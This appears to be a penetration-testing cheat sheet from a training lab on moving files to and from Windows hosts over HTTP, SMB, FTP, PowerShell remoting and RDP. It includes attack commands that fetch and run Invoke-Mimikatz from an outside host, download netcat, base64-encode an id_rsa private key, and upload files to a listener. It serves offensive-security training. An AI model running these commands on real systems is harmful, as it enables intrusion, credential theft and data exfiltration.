# Windows File Transfer

## Download Operations

### HTTP Method

```bash
python3 -m http.server 80
```

```powershell
# Execute a remote script
IEX(New-Object System.Net.WebClient).DownloadString('http://172.16.1.30/Invoke-Mimikatz.ps1')

# Invoke-Web-Request
IWR -Uri http://172.16.1.30/nc.exe -OutFile C:\temp\nc.exe

# Non-Interactive
(New-Object System.Net.WebClient).DownloadFile('http://172.16.1.30/nc.exe', 'C:\temp\nc.exe')

# Using certutil
certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
```

---

### SMB

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```powershell
# Mount
net use n: \\192.168.1.10\share /user:test test

# Download
copy \\192.168.1.10\nc.exe C:\temp\nc.exe

# Upload
copy C:\temp\supersecret.txt \\192.168.1.10\supersecret.txt
```

---

### PowerShell Base64 Encode & Decode

Windows Command Line utility (cmd.exe) has a maximum string length of  8,191 characters. Also, a web shell may error if you attempt to send  extremely large strings. 

**Encoding**

```bash
# Get file hash
md5sum id_rsa
4e301756a07ded0a2dd6953abf015278  id_rsa

# Encode
cat id_rsa |base64 -w 0;echo
LS0tLS1CR ---SNIP--- tLS0tLQo=
```

**Decoding**

```powershell
# Decode
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CR ---SNIP--- tLS0tLQo="))

# Check and match hash
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278
```

---

## Upload Operations

### PowerShell Base64 Encode & Decode

**Encode File Using PowerShell:**

```powershell
# Encode file
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B5cm ---SNIP--- YWxob3N0DQo=
# Get file hash
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```

**Decode Base64 String in Linux:**

```bash
# Decode file
echo IyBDb3B5cm ---SNIP--- YWxob3N0DQo= | base64 -d > hosts

# Check and match hash
md5sum hosts 

3688374325b992def12793500307566d  hosts
```

---

### PowerShell Web Uploads Base64

**Start the server:**

`python3 -m uploadserver`

**Upload file:**

```powershell
# Encode | Send
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))

Invoke-WebRequest -Uri http://192.168.1.10:8000/ -Method POST -Body $b64

# Catch with netcat and decode
nc -lvnp 8000

<base64> | base64 -d -w 0 > hosts
```

---

### Python FTP Uploads

**Start the server:**

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

**PowerShell Upload:**

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

**Create a Command File for the FTP Client to Upload a File**

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.1.10

Log in with USER and PASS first.

ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

## Misc

### PowerShell Session File Transfer

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration.

**From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.**          

```powershell
whoami
htb\administrator

hostname
DC01

Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

**Create a PowerShell Remoting Session to DATABASE01**

`$Session = New-PSSession -ComputerName DATABASE01`

**Copy samplefile.txt from our Localhost to the DATABASE01 Session** 

`Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\`

**Copy DATABASE.txt from DATABASE01 Session to our Localhost**

`Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session`

------

### RDP

Connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.

**Mounting a Linux Folder Using rdesktop**

`rdesktop 192.168.1.10 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files`

**Mounting a Linux Folder Using xfreerdp**

`xfreerdp3 /v:192.168.1.10 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer`
